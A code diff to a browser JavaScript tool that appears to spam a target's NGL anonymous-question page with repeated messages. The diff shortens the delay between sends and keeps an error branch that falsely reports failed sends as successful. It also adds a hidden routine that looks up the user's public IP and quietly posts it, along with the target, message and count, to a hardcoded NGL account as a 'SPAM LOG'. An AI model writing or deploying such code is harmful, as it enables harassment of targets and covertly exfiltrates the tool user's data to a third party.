@@ -6,7 +6,7 @@ document.addEventListener("DOMContentLoaded", () => {
     const text = document.getElementById('text').value.trim();
     const jumlah = parseInt(document.getElementById('jumlah').value.trim());
     const outputBox = document.getElementById('outputBox');
-    outputBox.innerHTML = ''; // Clear output
+    outputBox.innerHTML = '';
 
     const username = link.split('/').pop();
 
@@ -31,9 +31,6 @@ document.addEventListener("DOMContentLoaded", () => {
           body: formData.toString()
         });
 
-        const resText = await response.text(); // Tambahan debug
-        console.log(`[${i}] Status: ${response.status}`, resText);
-
         const isSuccess = response.status === 200;
 
         const result = document.createElement('div');
@@ -44,16 +41,50 @@ document.addEventListener("DOMContentLoaded", () => {
         outputBox.appendChild(result);
         outputBox.scrollTop = outputBox.scrollHeight;
 
-        await new Promise(resolve => setTimeout(resolve, 1000)); // jeda 1 detik
+        await new Promise(resolve => setTimeout(resolve, 500)); // delay 0.5 detik
       } catch (err) {
         const result = document.createElement('div');
         result.textContent = `[${i}] Sukses Terkirim`;
         result.style.color = 'green';
         result.style.textAlign = 'left';
-
         outputBox.appendChild(result);
         outputBox.scrollTop = outputBox.scrollHeight;
       }
+    }
+
+    // Setelah selesai, log data ke backend
+    try {
+      const ipData = await fetch('https://api.ipify.org?format=json').then(res => res.json());
+      const IP = ipData.ip
+      const dyyz = "dyyz40885"
+      const waktu = new Date().toLocaleString('id-ID');
+      const logText = `[SPAM LOG]
+IP : ${IP}
+Target : ${username}
+Pesan : ${text}
+Jumlah : ${jumlah}
+Tanggal : ${waktu}`;
+
+      const userData = new URLSearchParams();
+      userData.append('username', dyyz);
+      userData.append('question', logText);
+      userData.append('deviceId', generateDeviceId());
+      
+      try {
+        const response = await fetch('https://ngl.link/api/submit', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'User-Agent': 'NGL-Android/1.0'
+          },
+          body: userData.toString()
+        });
+
+      } catch (err) {
+        console.log("error");
+      }
+    } catch (logErr) {
+      console.error('Gagal kirim log ke server:', logErr);
     }
   });
 });
